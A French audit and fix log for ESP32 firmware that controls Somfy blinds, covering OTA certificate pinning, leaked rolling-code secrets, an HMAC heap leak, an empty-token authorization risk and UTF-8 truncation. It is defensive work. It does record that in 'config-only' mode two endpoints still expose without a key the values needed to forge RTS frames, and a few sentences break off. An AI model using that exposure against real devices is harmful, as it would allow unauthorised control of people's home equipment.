### C-4 : ce que la vérification du terrain a changé

Le rapport initial proposait d'épingler DigiCert. **C'était faux** : GitHub a migré chez Sectigo, et
les assets de release sortent par Let's Encrypt. Épingler DigiCert aurait cassé l'OTA de tous les
appareils au premier téléchargement. Chaîne relevée le 23/08/2026 :

| Hôte | Racine |
|---|---|
| `api.github.com`, `github.com`, `codeload.github.com` | Sectigo Public Server Authentication Root E46 |
| `objects.githubusercontent.com`, `raw.githubusercontent.com` | ISRG Root X1 (via la contre-signature de Root YR) |

Le bundle embarque quatre racines (Sectigo E46 + R46, ISRG X1 + YR), soit **6 603 octets** de
`.rodata`. R46 et YR sont de l'assurance : ils couvrent une bascule ECDSA→RSA côté Sectigo et le
retrait futur de la contre-signature côté Let's Encrypt, sans quoi l'OTA casserait sans préavis.

Vérification du bundle réellement compilé, magasin système désactivé :

```
api.github.com                     Verify return code: 0 (ok)
github.com                         Verify return code: 0 (ok)
objects.githubusercontent.com      Verify return code: 0 (ok)
raw.githubusercontent.com          Verify return code: 0 (ok)
www.google.com                     Verify return code: 20 (unable to get local issuer certificate)
example.com                        Verify return code: 20 (unable to get local issuer certificate)
```

La procédure de contrôle est en tête de `src/GitHubCA.h`. **Ce correctif authentifie le serveur, pas
l'image** : `downloadFile()` ne compare toujours qu'un nombre d'octets. La vérification par condensat
SHA-256 (recommandation n°2 du constat C-4) reste à faire.

### C-5 : la seconde moitié, appliquée le 24/08/2026

C-5 recommandait **deux** mesures. Seule la première (authentifier `/discovery`) avait été appliquée
le 23/08 ; `SomfyShade::toJSON()` continuait d'émettre `remoteAddress` et `lastRollingCode` dans la

`SomfyShade::toJSONRef()` reçoit le même traitement — il sert les `linkedShades` d'un groupe, donc
il traverse lui aussi le document de découverte ; l'oublier aurait laissé fuir par la bande
exactement ce qu'on retire ailleurs. Seul `discoveryProduceNext()` passe `false` ;
`controllerProduceNext()` est inchangé.

**Vérifié sur appareil**, en parcourant l'arbre JSON complet à la recherche des trois clés :

| Route | Secrets trouvés |
|---|---|
| `:8081/discovery` (3 volets, 2 groupes) | **aucun**, `linkedShades` imbriqués compris |
| `/shades` | 9 — conservés, l'interface en a besoin |
| `/controller` | 16 — conservés |

**Ce que ce correctif NE ferme PAS, et qu'il faut décider.** En mode « config seule »,
`checkAuth(request, false)` rend `true` sans clé : `/shades` et `/controller` servent donc toujours

```
config seule, sans clé :  :8081/discovery -> 0 secret
                          /shades         -> 3 remoteAddress, 3 lastRollingCode
```

Le couple qui permet de forger une trame RTS reste donc accessible dans ce mode — et c'est
précisément le mode recommandé pour faire fonctionner l'intégration Home Assistant

masquer aussi les secrets sur `/shades`/`/controller` quand la requête n'est pas authentifiée et
que le mode est « config seule ». Le tableau de bord public n'en a pas besoin ; seul le formulaire
d'édition d'un volet affiche `remoteAddress`, et il est de niveau configuration. Non fait ici :
cela dépasse le périmètre de C-5 et touche un écran légitime.

### E-13 — En-tête `apikey` absent de deux XHR (constat manqué par l'audit initial)
**Fichiers :** `95-firmware.js:77` (`firmware.backup`) et `95-firmware.js:1100` (`firmware.uploadFile`)
**Gravité : Élevé.** Trouvé le 23/08/2026 en test matériel, pas par l'audit.

```js
xhr.open('GET', baseUrl.length > 0 ? `${baseUrl}/backup` : '/backup', true);
xhr.send();                       // <-- aucun setRequestHeader('apikey', ...)
```

Ces deux XHR étaient les seuls du projet à ne pas poser l'en-tête. Invisible tant que
`Security.type` vaut `None` (`checkAuth()` laisse alors tout passer), **bloquant dès qu'un PIN ou un
mot de passe est configuré** :

- `firmware.backup()` est `await`é en tête du chemin d'installation OTA
  (`95-firmware.js:604`) : `GET /backup` répondait 401, la promesse était rejetée et la mise à jour
  s'interrompait avant même d'avoir commencé — symptôme observé, `Service: GET /backup /
  Unauthorized`.
- `firmware.uploadFile()` sert `/restore`, `/updateFirmware`, `/updateShadeConfig` et
  `/updateApplication` : **tout téléversement depuis le navigateur échouait** en sécurité active.

**Pourquoi l'audit l'a manqué.** La relecture a porté sur les routes serveur (qui exige quoi) et sur
les fuites de données, jamais sur l'inventaire des sites d'appel client (qui envoie quoi). Les deux
faces doivent se recouper. Le contrôle qui aurait dû exister — et qui est désormais reproductible :

```
# tout xhr.open() doit être suivi d'un setRequestHeader('apikey', ...) avant le send()
grep -n "xhr.open(" data-dev/js/*.js
```

**Correctif.** `xhr.setRequestHeader('apikey', security.apiKey || '')` après `xhr.open()` sur les
deux sites. Balayage complet refait : les 7 `xhr.open()` du projet posent maintenant l'en-tête, et
les seuls `fetch()` qui ne le posent pas visent des routes publiques (`/lang`, `/langDefault`,
`/manifest.json`) ou GitHub.

### E-14 — Boucle WebSocket bloquante sur loopTask pendant l'OTA (constat manqué par l'audit)
**Fichiers :** `GitOTA.cpp` — `emitDownloadProgress`, `emitLangDownloadProgress`,
`emitLangDownloadComplete`, `emitLangRestoreStatus`, et les boucles d'attente de `downloadFile()`
et `downloadLangFile()`
**Gravité : Critique.** Trouvé le 23/08/2026 en test matériel.

Téléchargement OTA figé à 5 %, puis :

```
LEN:1459536 TOTAL:77069 5%
[E][WiFiClient.cpp:429] write(): fail on fd 50, errno: 11, "No more processes"   (x24, 1/seconde)
E (384051) task_wdt: Task watchdog got triggered: loopTask (CPU 1)
```

**Mécanisme.** `errno 11` = EAGAIN : pendant le transfert, la pile Wi-Fi est saturée par le flux TLS
entrant (1,46 Mo) et une trame WebSocket sortante ne trouve plus de place dans le tampon d'émission
de sa socket. Les sept sites ci-dessus enchaînaient sur `sockEmit.loop()` →
`WebSocketsServer::loop()`, la boucle **interne** de links2004 : elle réessaie l'écriture sans borne
utile et **sans jamais nourrir le chien de garde**. `loopTask` y restait bloquée, ne lisait donc
plus le flux TLS — le téléchargement s'arrêtait — et le watchdog redémarrait l'appareil.

C'est mot pour mot le risque résiduel déjà documenté en tête de `WResp.cpp` (« la tâche principale
peut toujours passer jusqu'à 5 s dans `write()` sur un client bloqué, et la bibliothèque ne nourrit
pas le watchdog pendant ce temps »), que la charge d'une OTA rend enfin observable.

**Pourquoi l'audit l'a manqué.** Le risque avait bien été identifié — et écarté, en le lisant comme
un désagrément passager plutôt que comme un blocage. Ce qui manquait, c'est la mise en relation :
ce même appel bloquant se trouve sur le chemin d'un transfert de 1,4 Mo qui, lui, ne tolère aucune
interruption. Un risque « connu » n'est pas un risque évalué.

**Correctif.**
1. `sockEmit.loop()`/`webServer.loop()` retirés des sept sites. Ils étaient inutiles pour ÉMETTRE :
   sur la tâche principale `endEmit()` écrit déjà directement via `sendFrameFanOut()`, qui borne
   chaque envoi (`WEBSOCKETS_TCP_TIMEOUT`), nourrit le chien de garde autour de chaque client et
   déconnecte après `SOCK_WRITE_FAIL_LIMIT` échecs consécutifs. La boucle de la bibliothèque ne
   sert qu'à la réception et au heartbeat — dont on peut se passer le temps d'un téléchargement qui
   se termine par un redémarrage.
2. Étranglement des diffusions de progression à une toutes les 500 ms (la dernière passe toujours,
   sans quoi l'interface resterait figée à 99 %). Un événement par pour-cent, c'est une centaine
   d'occasions de blocage sur un firmware.
3. `esp_task_wdt_reset()` de part et d'autre de `sockServer.loop()` dans `SocketEmitter::loop()`,
   pour le chemin nominal.

**Ce correctif n'a pas encore été validé sur matériel.**

### E-15 — Interface piégée par un overlay d'OTA orphelin (constat manqué par l'audit)
**Fichiers :** `95-firmware.js` (`procFwStatus`), `20-shell.js` (`beforeunload`), `40-general.js`
(`onLanguageChanged`)
**Gravité : Élevé.** Trouvé le 23/08/2026 en test matériel, à la suite de E-14.

Symptôme rapporté : `Service: /uploadLang` + `reload-blocked: le rechargement de page n'a pas eu
lieu`. **Rien à voir avec les langues** : le téléversement et `/setLang` avaient réussi, seul le
`window.location.reload()` final n'aboutissait pas.

**Mécanisme, en deux défauts qui s'additionnent.**

1. Le verrou `data-lock-mode="hard"` de l'overlay d'installation OTA n'était retiré que par
   l'évènement de fin (`fwStatus`, `status === 4`). Un appareil qui redémarre en cours de route --
   ce qui venait précisément de se produire avec E-14 -- ne l'émet jamais : **l'overlay reste dans
   le DOM indéfiniment**, et son verrou continue d'armer le garde-fou `beforeunload`.
2. `onLanguageChanged()` recharge délibérément la page. Ce garde-fou n'existe que pour rattraper une
   navigation ACCIDENTELLE (F5, fermeture d'onglet) ; l'opposer à un rechargement que le code vient
   lui-même de déclencher n'a aucun sens. Le navigateur répondait par une confirmation de sortie,
   le rechargement restait suspendu, et le minuteur de secours de 5 s rejetait.

L'interface était donc **piégée jusqu'à la fermeture de l'onglet** après toute OTA interrompue :
plus aucune navigation, plus aucun rechargement.

**Pourquoi l'audit l'a manqué.** Même angle mort que E-13 : la relecture a porté sur le firmware et
sur les points d'injection, jamais sur les cycles de vie côté client. Un verrou dont la libération
dépend d'un unique évènement réseau est un état à durée de vie non bornée -- exactement le type
d'invariant qu'un audit doit chercher, et que je n'ai pas cherché.

**Correctif.**
1. `procFwStatus` retire l'overlay et son verrou si le device annonce « prêt » (`status === 0`)
   alors que l'overlay est encore affiché : à la reconnexion, `initClients` réémet l'état réel, et
   un statut « prêt » ne peut plus correspondre à une installation en cours. Sûr : dans le flux
   nominal, l'évènement `status === 4` arrive toujours AVANT (`GitUpdater::beginUpdate` l'émet, puis
   `loop()` repasse à 0), et l'overlay est déjà retiré à ce moment-là.
2. Aucun message d'issue n'est affiché dans ce cas : un `status === 4` perdu en route ressemble en
   tout point à un échec, et affirmer l'un ou l'autre serait inventer. Le badge de version, rafraîchi
   par le même évènement, montre l'état réel.
3. `appInitiatedReload()` (`20-shell.js`) neutralise `beforeunload` pour un rechargement décidé par
   l'application.

**Ce correctif n'a pas encore été validé sur matériel.**

### E-16 — Fuite de tas à chaque requête authentifiée : `mbedtls_md_setup()` sans `mbedtls_md_free()`

**Fichier :** `src/web/Web.cpp` — `Web::createAPIToken(const char *payload, char *token)`
**Trouvé :** 23/08/2026, sur signalement d'usage (« dès que la sécurité est activée, Max Heap
tombe à 38 900 et ne remonte jamais ; mise à jour OTA impossible »).

Le code fautif, inchangé depuis l'origine :

```cpp
mbedtls_md_context_t ctx;
mbedtls_md_setup(&ctx, mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), 1);
mbedtls_md_hmac_starts(...); mbedtls_md_hmac_update(...); mbedtls_md_hmac_finish(...);
// ni mbedtls_md_init() avant, ni mbedtls_md_free() après
```

`mbedtls_md_setup()` fait **deux allocations sur le tas** : le contexte SHA-256 via
`ctx_alloc_func()` (~116 octets, cf. `sha256_alt.h` du port ESP32) et, parce que le mode HMAC est
demandé (dernier argument à 1), un `calloc(2, block_size)` = 2 × 64 = 128 octets. L'en-tête de la
bibliothèque est explicite : *« If you have called mbedtls_md_setup() on ctx, you must call
mbedtls_md_free() »*. Aucune des deux n'était rendue — **~264 octets abandonnés par appel**,
en-têtes de bloc compris.

**Pourquoi le défaut ne se voyait qu'avec un PIN ou un mot de passe.** Sur `Security.type == None`,
`Web::checkAuth()` sort à sa toute première ligne et cette fonction n'est jamais atteinte hors
`/login`. Dès qu'une sécurité est active, elle est appelée pour :

- **chaque** requête HTTP authentifiée (`Web::checkAuth`) ;
- **chaque** poignée de main WebSocket (`socketHandshakeAuthorized`, `Sockets.cpp`) ;
- **chaque** requête du serveur OTA synchrone port 8082 (`isAuthenticatedSync`, `WebGitSync.cpp`).

Un simple chargement de l'interface en déclenche une vingtaine. Une session de gestion des langues
en déclenche des centaines : le catalogue est rechargé depuis une dizaine d'endroits, et chaque
installation de langue se termine par un rechargement complet de page
(`General.onLanguageChanged`), donc par un nouveau lot de requêtes authentifiées.

**Effet mesurable.** Ce ne sont pas seulement des octets perdus : ce sont des centaines de petits
blocs **permanents** éparpillés dans l'unique région DRAM qui porte le libre utile (cf. l'enquête
du 17/08/2026 plus haut). Le plus gros bloc **contigu** s'effondre donc bien plus vite que le total
libre — profil `free` élevé / `largest` bas. Or c'est ce plus gros bloc, et lui seul, qui décide de
la faisabilité d'une poignée de main TLS (`GIT_TLS_MIN_HEAP_BYTES`, `GitOTA.cpp`) : d'où l'OTA
devenue impossible et le téléchargement de langue instable, sans qu'aucun redémarrage réseau ne les
fasse remonter.

**Note sur l'enquête du 17/08/2026.** Elle avait explicitement écarté l'hypothèse « fuite mbedTLS ».
Ce n'était pas une erreur de raisonnement : toutes ses mesures ont été prises **sécurité
désactivée**, la seule configuration dans laquelle ce code ne s'exécute pas. Une hypothèse écartée
ne l'est jamais que dans la configuration testée.

**Correctif.** `mbedtls_md_init()` avant, `mbedtls_md_free()` après (y compris sur le chemin
d'échec de `setup()`), résultat de `setup()` vérifié. La charge utile HMAC est en outre composée
dans un tampon de pile (`snprintf`) au lieu de concaténations de `String`, qui fabriquaient 4 à
6 objets `String` — donc autant d'allocations/libérations — par requête authentifiée. Le format du
message signé est **identique caractère pour caractère** : les jetons déjà distribués restent
valides.

**Durcissement indissociable.** Le calcul pouvant désormais échouer proprement (tas épuisé), il
laisse `token` vide. Sans garde-fou, la comparaison `String(token) == request->header("apikey")`
opposerait deux chaînes vides — et l'interface envoie littéralement `apikey:` (vide) tant qu'aucune
session n'est ouverte (`deviceFetch`, `10-core-utils.js`). Une pénurie de mémoire se serait donc
transformée en autorisation. Les trois vérificateurs (`Web::checkAuth`, `socketHandshakeAuthorized`,
`isAuthenticatedSync`) refusent explicitement un échec de calcul et un jeton vide ; `/login` répond
503 plutôt que de délivrer une clé vide.

### E-17 — Progression du téléchargement de langue non étranglée : jumeau non corrigé de E-14

**Fichier :** `src/GitOTA.cpp` — `GitUpdater::emitLangDownloadProgress()`

Le correctif E-14 (étranglement à 500 ms des diffusions de progression, pour ne pas rester bloqué
dans `write()` sur un client congestionné pendant qu'on lit un flux TLS) n'avait été appliqué qu'au
chemin **firmware**. Le chemin **langue**, identique dans sa structure, était resté à une diffusion
WebSocket **par chunk** — et `downloadLangFile()` lit par blocs de 1 Ko
(`LANG_DOWNLOAD_BUFF_SIZE`), souvent moins dès que le flux TLS livre des segments partiels.

Mécanisme, exactement celui documenté sur `emitDownloadProgress()` : chaque diffusion peut rester
jusqu'à `WEBSOCKETS_TCP_TIMEOUT` (2 s) dans `write()`, et ce temps est volé à `loopTask` — la même
tâche qui doit continuer à lire le flux TLS entrant. Le flux finit par expirer
(`timeouts >= 500`), la boucle de lecture sort sur *« stream timeout »* et le transfert est déclaré
incomplet. **C'est le « téléchargement de langue instable » signalé, dans sa forme "échoue" par
opposition à sa forme "plante".**

**Correctif.** Même étranglement à `GIT_PROGRESS_MIN_INTERVAL` (500 ms), la dernière émission
passant toujours pour ne pas figer la barre juste avant 100 %. Le chien de garde est nourri même
quand l'émission est étranglée.

### E-18 — `onDisconnect` relâche un `git.lockFS` qui ne lui appartient plus (3 sites)

**Fichiers :** `src/web/WebI18n.cpp` (`/uploadLang`), `src/web/WebSystem.cpp` (`/restore`,
`/updateShadeConfig`)

Les trois écrivains LittleFS par chunks posaient `git.lockFS` puis enregistraient
`request->onDisconnect([]() { git.lockFS = false; })` comme filet de sécurité. Le filet est
nécessaire — une connexion qui tombe en plein transfert laisserait sinon le verrou tenu jusqu'au
redémarrage — mais il **relâche un verrou qui n'est plus le sien** : le rappel est armé au premier
chunk et ne se déclenche qu'à la fermeture de la **connexion**, pas de la requête. Sur une
connexion persistante (le cas normal d'un navigateur), il peut donc partir plusieurs secondes ou
plusieurs minutes après la fin de l'upload — typiquement au rechargement de page qui suit une
installation de langue.

Si une autre opération détient alors le verrou (téléchargement de langue en cours, écriture de
partition OTA), elle se le fait ouvrir sous les pieds. Une écriture LittleFS depuis la tâche
principale reprend pendant qu'une autre est en cours : c'est très exactement la configuration de
l'assert interne `lfs_mlist_isopen`, déjà rencontrée en usage réel, et donc la forme « plante » du
symptôme signalé.

**Correctif.** Couple `fsUploadLockAcquire()` / `fsUploadLockRelease()` (`WebCommon.h` / `Web.cpp`)
avec un drapeau de propriétaire : la libération ne fait quelque chose que si le verrou est encore
tenu par l'upload qui l'a posé. Idempotent des deux côtés, donc sûr depuis le chunk final **et**
depuis le rappel de déconnexion, dans n'importe quel ordre. L'acquisition est en outre vérifiée,
ce qui ferme une fenêtre TOCTOU entre le test de `git.lockFS` et sa pose.

### E-19 — Aucune persistance de session : le PIN redemandé à chaque rechargement de page

**Fichiers :** `data-dev/js/35-security.js`, `data-dev/js/40-general.js`, `src/web/WebAuth.cpp`

`security.apiKey` ne vivait qu'en mémoire vive. Or l'interface **se recharge elle-même** bien plus
souvent qu'il n'y paraît : `General.onLanguageChanged()` termine par `window.location.reload()`
après chaque installation ou changement de langue, et la fin d'une mise à jour firmware fait de
même. Chacun de ces rechargements ramenait l'écran de connexion — au beau milieu d'une opération
que l'utilisateur venait de lancer.

Effet de bord plus grave que la gêne : en sécurité complète, `Security.init()` n'ouvre la WebSocket
qu'après une connexion réussie. Après un rechargement, l'appareil restait donc **sans socket** —
donc sans progression, sans état de volet, sans `memStatus` — jusqu'à ce que le PIN soit ressaisi.

**Correctif.** La clé est persistée en `sessionStorage` (`espsomfy.apiKey`) : elle survit aux
rechargements de l'onglet, disparaît à sa fermeture — ce qui correspond exactement à « tant qu'il
est connecté ». Elle est restaurée **avant** l'appel à `/loginContext`, lequel renvoie désormais un
champ `authenticated` : le verdict du **firmware** sur la clé effectivement présentée, jamais une
déduction côté navigateur. Une clé périmée (PIN changé depuis un autre appareil, IP client changée
— le jeton en dépend —, NVS effacée) est rejetée là, purgée du stockage, et l'écran de connexion
réapparaît normalement.

Ce stockage n'aggrave aucune exposition : la clé est déjà lisible par le JavaScript de la page et
voyage en clair dans un en-tête à chaque requête, sur du HTTP local sans TLS. Elle est de toute
façon déterministe — `HMAC(secret, PIN + IP)`, cf. `Web::createAPIToken`. Le comportement d'avant
poussait surtout à choisir un code trivial.

**Reste non fait :** il n'existe toujours pas de déconnexion explicite dans l'interface (fermer
l'onglet en tient lieu). L'ajouter demande deux lignes — `security._clearSessionKey()` puis
`security.authUser()` — mais aucun emplacement n'a été décidé dans l'interface.

### T-1 — La troncature des noms coupe l'UTF-8 au milieu d'un caractère

**Trouvé le 24/08/2026 sur matériel**, en validant M-12. Hors numérotation M/E : l'audit ne l'avait
pas relevé. **CORRIGÉ le 24/08/2026 et vérifié sur appareil** (cf. la fin de cette fiche).

**Fichiers :** `src/somfy/SomfySerialize.cpp` (noms de pièce, volet, groupe), `src/Schedule.cpp:85`,
`src/ConfigSettings.cpp:136` (`BaseSettings::parseValueString`) — et côté client
`data-dev/index.html`, 17 champs de saisie.

```cpp
if(obj.containsKey("name")) strlcpy(this->name, obj["name"], sizeof(this->name));
```

`char name[21]` : `strlcpy` tronque au 20e **OCTET**, pas au 20e caractère. Si la coupe tombe entre
les deux octets d'un caractère accentué, l'octet de tête reste **orphelin** dans la chaîne stockée,
puis dans tout JSON qui la resérialise. Relevé brut sur l'appareil avec la pièce nommée
`Salon rez-de-chaussée` (21 caractères, 22 octets) :

```
5b 7b 22 72 6f 6f 6d 49 64 22 3a 31 2c 22 6e 61 6d 65 22 3a 22
53 61 6c 6f 6e 20 72 65 7a 2d 64 65 2d 63 68 61 75 73 73 c3 22 ...
                                                          ^^ ^^
                                        octet de tete orphelin, suivi du guillemet
```

**Ce que le constat n'est PAS.** Ma première conclusion — « toute l'interface tombe » — est
**fausse**, et la vérification navigateur l'a corrigée : `response.text()` décode en mode tolérant,
remplace l'octet par `U+FFFD` et `JSON.parse()` **réussit**. Le symptôme web est cosmétique
(`Salon rez-de-chauss�`). C'est précisément la différence avec M-12, dont le défaut produisait un
JSON syntaxiquement invalide que le navigateur, lui, refusait.

**Ce qui casse réellement : les consommateurs stricts.** Mesuré sur l'appareil, parseur JSON de
Python (celui de l'écosystème Home Assistant) :

```
GET /discovery  (port 8081)  >>> 'utf-8' codec can't decode byte 0xc3 : invalid continuation byte
GET /rooms                   >>> idem
GET /controller              >>> idem
```

`/discovery` est l'endpoint de l'intégration Home Assistant. MQTT propage l'octet invalide de son
côté (`espsomfy-CF8CF4/rooms/1/name`), vérifié à l'abonnement.

**Atteignabilité — mesurée, pas extrapolée** (144 noms français plausibles, plus variantes avec
emoji ; la coupe ne casse que si l'octet 19 est le premier d'un caractère multi-octets) :

| Corpus | Taux de casse |
|---|---|
| Noms français accentués | **1,4 %** — dont `Salon rez-de-chaussée`, `Salle rez-de-chaussée` |
| Emoji en tête de nom | 5,9 % |
| **Emoji en fin de nom** | **50,6 %** |

Aucun emoji n'est nécessaire pour déclencher le défaut. L'emoji en fin de nom — habitude courante en
domotique mobile — le rend en revanche quasi systématique, un caractère de 4 octets ayant beaucoup
plus d'occasions de chevaucher la limite.

**Facteur aggravant côté client, indissociable.** Les champs de saisie portent `length="20"`, qui
**n'est pas un attribut HTML** — le bon est `maxlength`. Les navigateurs l'ignorent purement et
simplement : il n'existe donc **aucune borne côté client**, sur aucun de ces champs. 17 champs sont
dans ce cas (`index.html:1398` nom de volet, `:2013` nom de groupe, plus hostname, serveur NTP, les
six champs MQTT, identifiants et mots de passe). Un utilisateur ne voit rien l'arrêter, et le
firmware tronque en silence.

**Portée.** Tous les `char[]` qui reçoivent de la saisie puis sont sérialisés : `SomfyShade::name`,
`SomfyGroup::name`, `SomfyRoom::name` et `ScheduleRule::name` (`char[21]`), `ConfigSettings::hostname`,
`MQTTSettings::rootTopic`/`discoTopic`/`hostname`/`username`, `SecuritySettings::username`,
`WifiSettings::ssid`.

**Correctif à faire, deux volets :**
1. **Firmware** — reculer la coupe jusqu'à une frontière de caractère UTF-8 : après le `strlcpy`,
   si le dernier octet conservé est un octet de tête (`0xC0-0xFF`) ou si la séquence finale est
   incomplète, le remplacer par `'\0'`. À placer dans un helper partagé, les sites de copie étant
   multiples. C'est la seule correction qui vaille : elle protège aussi les clients REST, qui
   n'ont aucune borne à opposer.
2. **Interface** — `length=` → `maxlength=` sur les 17 champs, en gardant à l'esprit que
   `maxlength` compte des **caractères** là où le tampon compte des **octets** : la valeur doit être
   dimensionnée en conséquence (ou un contrôle en octets ajouté), sans quoi le garde-fou client
   restera plus permissif que le firmware.

**Pourquoi l'audit l'a manqué.** Même angle mort que E-13, E-15 et les trois constats du 24/08, à
l'identique : M-12 a vérifié l'échappement des octets `0x00-0x1F` produits par le sérialiseur, sans
jamais se demander d'où venaient les octets qu'on lui donnait à échapper. Une chaîne déjà malformée
en amont traverse un échappement parfaitement correct.

**Correctif appliqué — 24/08/2026.**

*Firmware.* `strlcpyUtf8()` et `_trimPartialUtf8()` dans `src/Utils.h` : copie bornée qui retire,
après troncature, une éventuelle séquence UTF-8 incomplète en fin de chaîne. Appliqué aux quatre
noms d'entités (`SomfyShade`, `SomfyRoom`, `SomfyGroup` dans `SomfySerialize.cpp`, `ScheduleRule`
dans `Schedule.cpp`) et à `BaseSettings::parseValueString()` (`ConfigSettings.cpp`), qui couvre
d'un coup hostname, serveur NTP, topics MQTT, identifiants et couleur d'accent.

**Délibérément NON appliqué à `parseSecretString()`** (mot de passe, PIN) ni aux trois `strlcpy` de
`handleLogin` : ces deux côtés tronquent aujourd'hui à l'identique, et rendre un seul des deux
sensible à l'UTF-8 les ferait diverger — un mot de passe accentué enregistré ne correspondrait plus
à la saisie, enfermant l'utilisateur dehors. `parseIPAddress` et les codes langue sont ASCII par
construction. Ce choix vaut d'être conservé tel quel.

*Interface.* Les 17 champs portaient `length=`, **qui n'est pas un attribut HTML** — donc aucune
borne côté client. Les 12 champs texte/mot de passe passent à `maxlength`, dimensionné sur le
tampon firmware réel (au passage, le mot de passe MQTT annonçait 64 pour un `char[33]`). Les 6
champs `type="number"` voient l'attribut mort **supprimé** plutôt que converti : `maxlength` ne
s'applique pas aux entrées numériques, le remplacer aurait été troquer un no-op contre un autre —
ces champs sont bornés par `min`/`max`, qui fonctionnent.

`maxlength` compte des **caractères** là où le tampon compte des **octets** : la borne client reste
donc plus permissive que le firmware pour un texte accentué. C'est assumé — le garde-fou firmware
est celui qui décide, et il produit désormais une troncature propre au lieu d'une sortie corrompue.

**Vérifié hors cible** : rejeu de `_trimPartialUtf8()` sur 40 tailles de coupe d'une chaîne mêlant
ASCII, accents, `€` et emoji, plus six entrées délibérément malformées (octet de tête orphelin,
continuations seules, `0xFF`) — aucune ne produit d'UTF-8 invalide.

**Vérifié sur appareil** après flash, avec les noms qui cassaient :

```
'Salon rez-de-chaussée'   -> 'Salon rez-de-chauss'
'Chambre parentale 🛏'     -> 'Chambre parentale '
'居間居間居間居間居間居間'          -> '居間居間居間'
/rooms, /controller, :8081/discovery, :8081/rooms -> tous analysables en UTF-8 STRICT
```

### T-2 — Les drapeaux d'un VOLET ne sont jamais republiés sur MQTT (ceux d'un groupe le sont)

**Trouvé le 24/08/2026 sur matériel**, en validant M-9. Hors numérotation M/E.
**CORRIGÉ le 24/08/2026 et vérifié sur appareil** (cf. la fin de cette fiche).
Postérieur à la clôture du chantier MQTT, dont il prolonge exactement le raisonnement.

**Fichier :** `src/somfy/SomfyExpose.cpp` — `SomfyShade::publishState()` et
`SomfyShade::publishMovementState()`.

`flags`, `sunFlag`, `sunny` et `windy` ne sont publiés que par `publishState()`, laquelle n'est
atteinte que depuis `SomfyShade::publish()` — donc **à l'enregistrement du volet et à la connexion
au courtier**, rien d'autre. `publishMovementState()`, qui tourne à chaque tour de boucle et
compare l'état courant à ce qui a réellement été publié, ne couvre que `direction`,
`tiltDirection`, `position`, `target`, `tiltPosition` et `tiltTarget` : **pas un seul drapeau**.

Un changement de drapeau ne remonte donc jamais, quelle que soit son origine — commande MQTT
`sunFlag/set`, commande `SunFlag`/`Flag` reçue d'une télécommande physique, ou **trame de capteur
soleil/vent** (bits `Sunny`/`Windy`), qui est le chemin automatique et le plus important pour une
domotique.

**Relevé décisif** (abonnement établi AVANT la commande, valeur retenue et état REST tous deux à
128 au départ — un `129` reçu aurait donc forcément été une republication) :

```
commande : espsomfy-CF8CF4/shades/3/sunFlag/set  <- 1
REST /shade?shadeId=3   : flags = 129   (bit SunFlag posé)
MQTT shades/3/flags     : 128           (le retenu, aucune republication)
```

**L'asymétrie est le cœur du constat.** Le même essai sur un **groupe** republie correctement, en
direct :

```
MQTT groups/1/sunFlag <- 1
  recu : groups/1/sunFlag 1
  recu : groups/1/flags   129
```

Volets et groupes divergent donc sur un comportement qui devrait être identique — précisément la
classe d'écart que le chantier MQTT avait pour objet.

**Correctif à faire.** Étendre le motif déjà retenu et documenté dans `publishMovementState()` :
mémoriser `pubFlags` à côté des autres champs fantômes et republier `flags` (plus `sunFlag`/`sunny`
sous `hasSunSensor()`, et `windy`) dès qu'il diffère. Le commentaire en tête de cette fonction
explique déjà pourquoi on compare l'état publié plutôt que de greffer la publication sur les douze
appels à `emitState()` — le raisonnement s'applique tel quel, il n'a simplement pas été étendu aux
drapeaux.

**Pourquoi le chantier MQTT l'a manqué.** Il a corrigé le figeage de `shades/N/position` pendant un
trajet, en construisant la comparaison état courant / état publié. Les drapeaux changent par les
mêmes chemins mais n'ont pas été portés sur ce mécanisme — et rien ne le signalait, la publication
initiale à l'enregistrement donnant une valeur d'apparence correcte tant qu'on ne la fait pas varier.

**Correctif appliqué — 24/08/2026.** `src/somfy/Somfy.h`, `src/somfy/SomfyExpose.cpp`. La logique
d'émission des drapeaux est extraite dans un **émetteur unique**, `SomfyShade::publishFlags()`,
appelé par `publishState()` ET par `publishMovementState()` — plutôt qu'un second bloc dupliqué,
qui redivergerait tôt ou tard. C'est la duplication qui était la cause racine, pas l'oubli.
Un champ fantôme `pubFlags` (`int16_t`, -1 = jamais publié, `flags` occupant tout 0..255) porte la
comparaison. Les drapeaux ne sont **pas** étranglés, pour la même raison que `direction` : ils ne
changent qu'aux transitions, et c'est précisément pendant un mouvement qu'un capteur de vent se
déclenche — le bloc est donc placé avant le `return` d'étranglement.

Corrigé au passage : `SomfyShade::publish()` publiait `flags` de son côté, puis appelait
`publishState()` qui le republiait — deux messages retenus identiques par enregistrement de volet,
chacun coûtant un aller-retour vers le courtier sur la tâche principale. `publishFlags()` en est
désormais le propriétaire unique.

**Vérifié sur appareil** : abonnement établi AVANT la commande, valeur retenue à 0 ; après
`shades/1/sunFlag/set <- 1`, réception de `shades/1/flags 1` en direct, REST concordant.

### T-3 — CRITIQUE : le correctif M-11 rendait toute la configuration illisible au redémarrage

**Trouvé le 24/08/2026 sur matériel**, en flashant le correctif T-2. **Régression introduite par
un correctif de cet audit** (commit `17bb717`, « fix(somfy): quatre défauts de correction (M-1,
M-2, M-11, M-18) »), corrigée le jour même et vérifiée sur appareil.

**Fichier :** `src/ConfigFile.cpp` — `ConfigFile::readString()`.

M-11 avait remplacé `while(i < len)` par `while(i < len - 1)` pour réserver le dernier octet au
terminateur. Le raisonnement écrit à l'époque juste au-dessus de la fonction affirmait :

> « Aucun changement sur un fichier BIEN FORMÉ [...] Le plafond ne mord que sur une entrée
> malformée -- exactement l'intention. »

**C'était faux, et c'est toute l'affaire.** `writeString()` pade chaque champ à **exactement**
`len-1` octets avant son séparateur : le cas nominal est donc précisément celui qui atteint le
plafond. Le retour anticipé `if(i == len - 1)` rendait la main **sans consommer le séparateur** ;
la lecture suivante tombait dessus, rendait une chaîne vide, et tout l'enregistrement se décalait
d'un champ. Le plafond ne mordait pas « rarement » : il mordait à **chaque champ numérique de
chaque enregistrement**.

**Symptôme mesuré.** `shades.cfg` était écrit correctement — vérifié en lisant le fichier brut par
la route `/shades.cfg`, qui contenait bien `316` (`SHADE_REC_SIZE`), `76` (`SHADE_HDR_SIZE`), `29`
(`ROOM_REC_SIZE`) et `206` (`GROUP_REC_SIZE`) — puis relu ainsi :

```
version:26 len:0 roomSize:76 roomRecs:0 shadeSize:29 shadeRecs:0 groupSize:0 groupRecs: 3 pos:38
Invalid Shade Record Size:29
Shade config file invalid!
```

Chaque valeur est décalée d'un cran : le `76` du fichier atterrit dans `roomSize`, le `29` dans
